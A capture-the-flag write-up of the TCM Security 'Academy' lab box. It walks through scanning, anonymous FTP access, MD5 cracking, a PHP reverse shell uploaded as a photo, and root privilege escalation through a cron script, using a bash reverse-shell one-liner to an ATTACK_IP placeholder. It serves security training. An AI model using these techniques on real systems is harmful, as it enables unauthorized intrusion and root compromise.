# Academy Box - Provided by TCM Security

- Box has IP address `10.0.2.10`

## Scanning and Enumeration

- Running nmap scan against target machine

    ![Nmap Results](./screenshots/2022-03-03-22-37-33.png)

- Interest findings
  - Port `21/tcp - ftp - Anonymous FTP login allowed - vsftpd 3.0.3`
  - Port `22/tcp - SSH - OpenSSH 7.9p1 Debian`
  - Port `80/tcp - http - Apache2 httpd 2.4.38`
  - OS details - `Linux 4.15 | 5.6`

- Since I found port `80` open, running `nikto` against target
  
  ![Nikto results](./screenshots/2022-03-03-22-50-28.png)

- Also ran `Disbuster`
  
  ![Dirbuster](./screenshots/2022-03-03-23-16-19.png)

## Research

- `Anonymous FTP login allowed (FTP code 230)` was interesting in the results.
  - Found this site - [Anonymous Login](https://vk9-sec.com/anonymous-login/)

## Exploitation

- Using `auxiliary/scanner/ftp/anonymous` module to detect anonymous FTP access

    ![Anonymous FTP](./screenshots/2022-03-03-22-56-35.png)

  - Results show anonymous login has `READ` permissions

- Used `anonymous` user to connect to FTP target machine

    ![FTP Anonymous Connection](./screenshots/2022-03-03-23-01-59.png)

- I was able to get the `note.txt` from the target. These are the contents of it

    ![note.txt contents](./screenshots/2022-03-03-23-05-06.png)

- Grabbed the hash from the file and used `hash-identifier`, determined it was an `MD5` hash

    ![hash-identifier](./screenshots/2022-03-03-23-09-19.png)

- Used `hashcat` to crack the hash which turned out to be `student`

    ![Hashcat](./screenshots/2022-03-03-23-15-16.png)

- Grabbed the Registration number from `note.txt` and the cracked password to login.
- Once logged in was prompted to change password, so I went ahead and did that.

  ![Logged in](./screenshots/2022-03-03-23-20-58.png)

- Used a [`php-reverse-shell`](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) by uploading it to the site using the photo upload

  ![Uploaded File](./screenshots/2022-03-04-17-14-33.png)

- Set `netcat` to listen on the port the exploit uses

  ![Popped Shell](./screenshots/2022-03-04-17-14-09.png)

## Privilege Escalation

- Downloaded `linpeas.sh` and put it in a transfer folder.
- Then used python to host a web server and then did `wget` on the victim machine

  ![Attacker Web server](./screenshots/2022-03-04-17-26-57.png)

  ![Victim machine](./screenshots/2022-03-04-17-27-07.png)

- Ran `linpeas.sh` on the victim machine
- Found user `grimmie` and a password - was able to ssh using these credentials

  ![SSH connection](./screenshots/2022-03-04-17-51-00.png)

- Found file `/home/grimmie/backup.sh` - and figured out it runs every minute
- Added a bash reverse shell one-liner - `bash -i >& /dev/tcp/ATTACK_IP/PORT 0>&1`
- Set netcat to listen on port

  ![Reverse Shell](./screenshots/2022-03-04-18-08-33.png)

- Executes as `root` and pops a `root` shell on the attacker machine

  ![Root Shell](./screenshots/2022-03-04-18-11-27.png)

- Found `flag.txt`

  ![flag.txt](./screenshots/2022-03-04-18-12-52.png)
